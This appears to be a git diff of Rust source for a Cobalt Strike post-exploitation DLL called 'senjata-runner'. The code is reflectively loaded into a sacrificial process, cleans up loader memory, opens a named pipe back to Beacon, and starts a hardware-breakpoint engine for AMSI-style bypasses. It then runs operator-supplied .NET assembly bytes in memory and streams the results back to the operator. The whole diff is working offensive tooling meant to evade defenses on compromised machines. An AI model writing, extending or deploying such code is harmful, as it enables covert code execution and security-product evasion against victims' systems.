@@ -1,10 +1,32 @@
 //! senjata-runner — UDPK postex DLL. Reflectively loaded by Cobalt Strike
-//! into a sacrificial process via `beacon_execute_postex_job`. Receives
-//! the BeaconAPI function table and the orchestrator's input args, then
-//! invokes `clr_orchestrator::orchestrate()`.
+//! into a sacrificial process via `beacon_execute_postex_job`.
 //!
-//! Built as `cdylib` → produces a Windows DLL with a single named export
-//! (`postex_main`) that CS calls.
+//! ABI contract (mirrors `arsenal-kit/kits/postex/base`):
+//!
+//! - Single exported entry point `DllEntryPoint(HMODULE, DWORD reason,
+//!   LPVOID lpReserved, BOOL startNamedPipe)`. CS's reflective loader
+//!   calls it twice: once with the standard `DLL_PROCESS_ATTACH` (1) so
+//!   the linker-generated CRT thunks initialise, then again with the
+//!   custom `DLL_POSTEX_ATTACH` (4) once the IAT has been smartinject-
+//!   rewritten and the postex argument buffer is populated. Real work
+//!   happens on the second call.
+//!
+//! - Two writable globals CS rewrites at load time:
+//!   `gPostexArgumentsBuffer` (POSTEX_ARGUMENTS struct) and
+//!   `gPipeName` (named-pipe path). Both must be byte-pattern-locatable
+//!   and live in a writable section.
+//!
+//! - BeaconAPI functions (`BeaconOutput`, `BeaconPrintf`, …) appear in
+//!   the IAT against `beacon.dll`; smartinject rewrites those entries to
+//!   point at in-process proxies that forward to Beacon via the named
+//!   pipe whose handle lives in `gPipeHandle`. The pipe MUST exist before
+//!   any BeaconAPI call OR before `bread_pipe` runs operator-side —
+//!   otherwise the operator sees `ERROR_FILE_NOT_FOUND (2)` and our
+//!   orchestrator output is lost.
+//!
+//! Built as `cdylib` → produces a Windows DLL whose only externally
+//! interesting export is `DllEntryPoint`.
+
 #![no_std]
 #![no_main]
 #![cfg(target_os = "windows")]
@@ -17,6 +39,8 @@ static __ALLOC: rustbof::allocator::BeaconAlloc = rustbof::allocator::BeaconAllo
 mod args;
 mod beacon_api;
 mod cleanup;
+mod pipes;
+mod postex;
 mod streamer;
 
 #[cfg(not(test))]
@@ -25,37 +49,121 @@ fn panic(_: &core::panic::PanicInfo) -> ! {
     loop {}
 }
 
-/// CS UDPK entrypoint. The postex shellcode calls this after reflective DLL
-/// load completes. `data` points at a CS-allocated blob whose layout is:
-///   [BeaconAPI function pointer table][packed orchestrator args]
-///
-/// We're given the length; we split the blob and dispatch.
-#[unsafe(no_mangle)]
-pub unsafe extern "system" fn postex_main(data: *mut u8, len: i32) {
-    unsafe {
-        // 1. Resolve BeaconAPI from the head of the blob.
-        let api = beacon_api::parse(data, len as usize);
-        let (args_ptr, args_len) = beacon_api::args_blob(data, len as usize);
+use core::ffi::c_void;
+use core::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};
 
-        // 2. Parse orchestrator args.
-        let parsed = match args::parse(args_ptr as *mut core::ffi::c_void, args_len) {
+use windows_sys::Win32::Foundation::{BOOL, HANDLE, HMODULE};
+
+// HMODULE / HANDLE are both type aliases for `*mut c_void` in windows-sys
+// 0.59 — clippy flags the conversions, but the cast-through helps when
+// we ever bump to a windows-sys major that strengthens these typedefs.
+#[allow(clippy::unnecessary_cast)]
+fn hmodule_to_void(h: HMODULE) -> *mut c_void { h as *mut c_void }
+use windows_sys::Win32::System::SystemServices::{
+    DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH,
+};
+
+use crate::postex::DLL_POSTEX_ATTACH;
+
+/// HMODULE saved from `DLL_PROCESS_ATTACH`. Used by `CleanupLoaderMemory`
+/// during `DLL_POSTEX_ATTACH` and held in static storage so the value
+/// survives the LoaderLock-bracketed gap between the two calls.
+static LOADED_DLL_BASE: AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
+
+/// Streamer thread handle, threaded from the pipe-ready hook back to the
+/// final join site so the reader drains every byte before we exit.
+static STREAMER_THREAD: AtomicUsize = AtomicUsize::new(0);
+
+/// CS UDPK reflective-loader entrypoint. Layout matches Arsenal Kit
+/// `dllmain.cpp::DllEntryPoint`.
+///
+/// # Safety
+/// Called by CS's reflective loader and CRT thunk. Standard DllMain
+/// safety rules apply: do NOT touch BeaconAPI or any extern "C" import
+/// during `DLL_PROCESS_ATTACH` — LoaderLock is held and smartinject
+/// hasn't rewritten the IAT yet. All non-trivial work goes into the
+/// `DLL_POSTEX_ATTACH` branch.
+#[unsafe(no_mangle)]
+pub unsafe extern "system" fn DllEntryPoint(
+    h_module: HMODULE,
+    ul_reason_for_call: u32,
+    lp_reserved: *mut c_void,
+    start_named_pipe: BOOL,
+) -> BOOL {
+    unsafe {
+        match ul_reason_for_call {
+            DLL_PROCESS_ATTACH => {
+                LOADED_DLL_BASE.store(hmodule_to_void(h_module), Ordering::Relaxed);
+            }
+            DLL_THREAD_ATTACH | DLL_THREAD_DETACH | DLL_PROCESS_DETACH => {}
+            r if r == DLL_POSTEX_ATTACH => {
+                run_postex(h_module, lp_reserved, start_named_pipe != 0);
+                // run_postex never returns — postex_exit calls ExitProcess.
+            }
+            _ => {}
+        }
+        1 // TRUE
+    }
+}
+
+/// Real postex work — runs in the second `DllEntryPoint` call. Never
+/// returns; reaches `postex_exit` which calls ExitProcess/ExitThread.
+unsafe fn run_postex(h_module: HMODULE, lp_reserved: *mut c_void, start_named_pipe: bool) -> ! {
+    unsafe {
+        // 1. Snapshot POSTEX_ARGUMENTS — CS UDRL wrote this in just
+        //    before invoking us.
+        let pa = postex::read_postex_arguments();
+        let user_args_size = pa.user_argument_buffer_size;
+        let user_args_ptr = if user_args_size > 0 && !lp_reserved.is_null() {
+            lp_reserved
+        } else {
+            core::ptr::null_mut()
+        };
+
+        // 2. Best-effort loader cleanup (so the only resident allocation
+        //    is our heap + smartinject's proxies).
+        if pa.cleanup_loader > 0 {
+            let base = LOADED_DLL_BASE.load(Ordering::Relaxed);
+            let cleanup_target = if !base.is_null() { base } else { hmodule_to_void(h_module) };
+            // Ignore return value — failure just leaves the loader pages
+            // resident; not fatal.
+            let _ = postex::cleanup_loader_memory(cleanup_target);
+        }
+
+        // 3. Start the named pipe server BEFORE anything else can call
+        //    BeaconAPI. Operator-side `bread_pipe` connects to this pipe;
+        //    smartinject proxies write to it; our streamer writes to it.
+        //    If this fails we still try to run — orchestrator output gets
+        //    lost but a hard exit is worse.
+        if start_named_pipe {
+            let _ = pipes::start_named_pipe_server();
+        }
+
+        // 4. Parse orchestrator args from the user-arg buffer.
+        let parsed = match args::parse(user_args_ptr, user_args_size as usize) {
             Ok(a) => a,
             Err(_e) => {
-                api.output(beacon_api::CALLBACK_ERROR, b"[runner] args parse failed\n");
-                cleanup::terminate_self();
+                beacon_api::output(
+                    beacon_api::CALLBACK_ERROR,
+                    b"[runner] args parse failed\n",
+                );
+                postex::postex_exit(start_named_pipe, pa.exit_func);
             }
         };
 
-        // 3. Init HWBP engine (used by orchestrator's bypass installers).
+        // 5. Initialise HWBP engine for the orchestrator's bypass installers.
         let engine = match opsec_hwbp::HwbpEngine::init() {
             Ok(e) => e,
             Err(_) => {
-                api.output(beacon_api::CALLBACK_ERROR, b"[runner] hwbp init failed\n");
-                cleanup::terminate_self();
+                beacon_api::output(
+                    beacon_api::CALLBACK_ERROR,
+                    b"[runner] hwbp init failed\n",
+                );
+                postex::postex_exit(start_named_pipe, pa.exit_func);
             }
         };
 
-        // 4. Build OrchestrateInput borrowing from `parsed`.
+        // 6. Build the orchestrator input.
         let input = clr_orchestrator::OrchestrateInput {
             app_domain: &parsed.app_domain,
             amsi: parsed.amsi,
@@ -70,64 +178,50 @@ pub unsafe extern "system" fn postex_main(data: *mut u8, len: i32) {
             asm_bytes: &parsed.asm_bytes,
         };
 
-        // 5. Run orchestrator in streaming mode. The hook captures the
-        //    pipe read handle and spawns a reader thread that forwards
-        //    output to operator live, instead of waiting for end-of-run
-        //    drain.
-        //
-        //    STREAMER_THREAD is an AtomicPtr<c_void> so the thunk and the
-        //    join site below can share state without static_mut_refs
-        //    triggering. postex_main runs at most once per process, so
-        //    the load/store sequencing is implicit.
-        use core::sync::atomic::{AtomicPtr, Ordering};
-        static STREAMER_THREAD: AtomicPtr<core::ffi::c_void> =
-            AtomicPtr::new(core::ptr::null_mut());
-
-        unsafe extern "C" fn pipe_ready_thunk(
-            read_handle: windows_sys::Win32::Foundation::HANDLE,
-            ctx: *mut core::ffi::c_void,
-        ) {
+        // 7. Streaming orchestrate. The pipe-ready hook captures the
+        //    orchestrator's internal pipe read handle and spawns a
+        //    reader thread that forwards bytes to BeaconOutput live.
+        unsafe extern "C" fn pipe_ready_thunk(read_handle: HANDLE, _ctx: *mut c_void) {
             unsafe {
-                let api: &beacon_api::Api = &*(ctx as *const beacon_api::Api);
-                let h = streamer::spawn(read_handle, api);
-                STREAMER_THREAD.store(h.cast(), Ordering::Relaxed);
+                let h = streamer::spawn(read_handle);
+                STREAMER_THREAD.store(h as usize, Ordering::Relaxed);
             }
         }
 
-        let api_ctx: *mut core::ffi::c_void =
-            &api as *const beacon_api::Api as *mut core::ffi::c_void;
         let result = clr_orchestrator::orchestrate_streaming(
             &input,
             &engine,
             pipe_ready_thunk,
-            api_ctx,
+            core::ptr::null_mut(),
         );
 
-        // 6. Wait for the reader to flush every buffered byte before we
-        //    terminate — otherwise final chunks may be lost.
-        let thread_handle: windows_sys::Win32::Foundation::HANDLE =
-            STREAMER_THREAD.load(Ordering::Relaxed).cast();
+        // 8. Drain the streamer thread before exit so the last chunk of
+        //    output isn't truncated when our process dies.
+        let thread_handle: HANDLE = STREAMER_THREAD.load(Ordering::Relaxed) as HANDLE;
         streamer::join(thread_handle);
 
         match result {
-            Ok(()) => api.output(beacon_api::CALLBACK_OUTPUT, b"[runner] done\n"),
+            Ok(()) => beacon_api::output(beacon_api::CALLBACK_OUTPUT, b"[runner] done\n"),
             Err(e) => {
                 let msg = e.format();
-                api.output(beacon_api::CALLBACK_ERROR, msg.as_bytes());
-                api.output(beacon_api::CALLBACK_ERROR, b"\n");
+                beacon_api::output(beacon_api::CALLBACK_ERROR, msg.as_bytes());
+                beacon_api::output(beacon_api::CALLBACK_ERROR, b"\n");
             }
         }
 
-        // 7. Exit sacrificial.
-        cleanup::terminate_self();
+        // 9. Exit per PostexArguments::ExitFunc.
+        postex::postex_exit(start_named_pipe, pa.exit_func);
     }
 }
 
-#[unsafe(no_mangle)]
-pub extern "system" fn DllMain(
-    _module: *mut core::ffi::c_void,
-    _reason: u32,
-    _reserved: *mut core::ffi::c_void,
-) -> i32 {
-    1
+/// Backstop the linker won't optimise away. References the two globals
+/// CS needs to find by byte pattern. `#[used]` on a `static` of named
+/// function-pointer type keeps LLVM honest under aggressive LTO.
+type AnchorFn = fn() -> *const u8;
+
+#[used]
+static _ANCHOR: [AnchorFn; 2] = [postex::buffer_addr, pipe_name_addr];
+
+fn pipe_name_addr() -> *const u8 {
+    core::ptr::addr_of!(pipes::gPipeName) as *const u8
 }
